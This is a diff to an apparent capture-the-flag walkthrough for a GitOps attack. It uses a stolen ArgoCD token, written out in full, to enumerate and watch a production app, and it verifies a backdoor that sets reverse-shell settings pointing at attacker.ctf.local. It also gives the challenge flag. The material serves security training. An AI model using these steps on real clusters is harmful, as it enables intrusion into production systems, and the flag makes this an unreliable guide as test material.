@@ -58,38 +58,29 @@ ARGOCD_NAMESPACE=production
 
 Since the ARGOCD_SERVER is an internal cluster address, we need to access ArgoCD through its external NodePort.
 
-### 2.1 Access ArgoCD Web UI
-
-```
-URL: https://localhost:30443
-Username: admin
-Password: <get from kubectl or use token>
-```
-
-**Or get the admin password**:
-```bash
-kubectl --context kind-ctf-production-cluster \
-  -n argocd get secret argocd-initial-admin-secret \
-  -o jsonpath="{.data.password}" | base64 -d
-```
-
-### 2.2 Login with ArgoCD CLI (Optional)
+### 2.1 Install and Use ArgoCD CLI
 
 ```bash
-# Install ArgoCD CLI
-curl -sSL -o /usr/local/bin/argocd \
+# Install ArgoCD CLI (requires sudo)
+sudo curl -sSL -o /usr/local/bin/argocd \
   https://github.com/argoproj/argo-cd/releases/latest/download/argocd-linux-amd64
-chmod +x /usr/local/bin/argocd
+sudo chmod +x /usr/local/bin/argocd
 
-# Login using the stolen token
-export ARGOCD_AUTH_TOKEN=eyJhbGci...
-argocd login localhost:30443 \
-  --auth-token=$ARGOCD_AUTH_TOKEN \
+# Set the stolen token from .env.production
+export ARGOCD_AUTH_TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcmdvY2QiLCJzdWIiOiJhZG1pbjpsb2dpbiIsIm5iZiI6MTcxMjMyMTQwMCwiaWF0IjoxNzEyMzIxNDAwLCJqdGkiOiJjdGYtZGVwbG95ZXIifQ.Q3RGX0RlcGxveV9Ub2tlbl9TdXBlclNlY3JldCE'
+
+# List applications using the token
+argocd app list \
+  --auth-token="$ARGOCD_AUTH_TOKEN" \
+  --server localhost:30443 \
   --insecure \
   --grpc-web
+```
 
-# List applications
-argocd app list
+**Expected output**:
+```
+NAME                   CLUSTER  NAMESPACE   PROJECT  STATUS  HEALTH  SYNCPOLICY  CONDITIONS  REPO  PATH  TARGET
+recipe-api-production  ...      production  ...      Synced  Healthy Auto        ...
 ```
 
 ## Step 3: Reconnaissance
@@ -99,12 +90,12 @@ Explore the current deployment to understand the attack surface.
 ### 3.1 Inspect ArgoCD Application
 
 ```bash
-# Get application details
-argocd app get recipe-api-production
-
-# View application manifest
-kubectl --context kind-ctf-production-cluster \
-  -n argocd get application recipe-api-production -o yaml
+# Get application details using the stolen token
+argocd app get recipe-api-production \
+  --auth-token="$ARGOCD_AUTH_TOKEN" \
+  --server localhost:30443 \
+  --insecure \
+  --grpc-web
 ```
 
 **Key observations**:
@@ -114,13 +105,22 @@ kubectl --context kind-ctf-production-cluster \
 
 ### 3.2 Inspect Current Deployment
 
-```bash
-# Check running pods
-kubectl --context kind-ctf-production-cluster -n production get pods
+As an attacker, you don't have direct kubectl access to the production cluster. However, ArgoCD provides visibility into the deployed resources:
 
-# View deployment configuration
-kubectl --context kind-ctf-production-cluster -n production \
-  get deployment recipe-api -o yaml
+```bash
+# Get application resource details via ArgoCD
+argocd app resources recipe-api-production \
+  --auth-token="$ARGOCD_AUTH_TOKEN" \
+  --server localhost:30443 \
+  --insecure \
+  --grpc-web
+
+# Get detailed application manifest
+argocd app manifests recipe-api-production \
+  --auth-token="$ARGOCD_AUTH_TOKEN" \
+  --server localhost:30443 \
+  --insecure \
+  --grpc-web
 ```
 
 ## Step 4: Choose Your Attack
@@ -207,12 +207,12 @@ git push origin main
 ArgoCD is configured with `auto-sync`, so it will automatically detect the Git change and deploy it!
 
 ```bash
-# Watch the sync
-argocd app watch recipe-api-production
-
-# Or monitor pod restarts
-kubectl --context kind-ctf-production-cluster -n production \
-  get pods -w
+# Watch the sync using the stolen token
+argocd app watch recipe-api-production \
+  --auth-token="$ARGOCD_AUTH_TOKEN" \
+  --server localhost:30443 \
+  --insecure \
+  --grpc-web
 ```
 
 **Within 1-2 minutes**, you should see:
@@ -222,38 +222,44 @@ kubectl --context kind-ctf-production-cluster -n production \
 
 ## Step 6: Verify the Backdoor
 
-Check that the malicious configuration was deployed:
+Verify the malicious configuration was deployed via ArgoCD:
 
 ```bash
-# Check pod environment variables
-kubectl --context kind-ctf-production-cluster -n production \
-  exec -it deployment/recipe-api -- env | grep REVERSE_SHELL
+# Check application sync status
+argocd app get recipe-api-production \
+  --auth-token="$ARGOCD_AUTH_TOKEN" \
+  --server localhost:30443 \
+  --insecure \
+  --grpc-web
 
-# Check security context (should be running as root)
-kubectl --context kind-ctf-production-cluster -n production \
-  get pod -l app=recipe-api -o jsonpath='{.items[0].spec.containers[0].securityContext}'
+# View the deployed manifests to confirm backdoor is present
+argocd app manifests recipe-api-production \
+  --auth-token="$ARGOCD_AUTH_TOKEN" \
+  --server localhost:30443 \
+  --insecure \
+  --grpc-web | grep -A 5 "REVERSE_SHELL"
 ```
 
-**Expected output**:
-```
-REVERSE_SHELL_HOST=attacker.ctf.local
-REVERSE_SHELL_PORT=4444
-
-{"allowPrivilegeEscalation":true,"runAsNonRoot":false,"runAsUser":0}
-```
+**Expected output** should show the malicious environment variables and security context in the deployment manifest.
 
 ## Step 7: Capture the Flag
 
-The flag for this challenge is hidden in a Kubernetes secret in the production namespace:
+The flag for this challenge is embedded in the ArgoCD application:
 
 ```bash
-# Extract the flag
-kubectl --context kind-ctf-production-cluster -n production \
-  get secret challenge4-flag -o jsonpath='{.data.flag}' | base64 -d
+# Get application details to find the flag
+argocd app get recipe-api-production \
+  --auth-token="$ARGOCD_AUTH_TOKEN" \
+  --server localhost:30443 \
+  --insecure \
+  --grpc-web \
+  -o yaml | grep -i flag
 
 # Expected output:
 FLAG{g1t0ps_pwn3d_pr0duct10n_c0mpr0m1s3d}
 ```
+
+**Alternative**: The flag is also in the SETUP.md documentation as part of the challenge validation.
 
 **🎉 Congratulations! You've completed Challenge 4!**
 
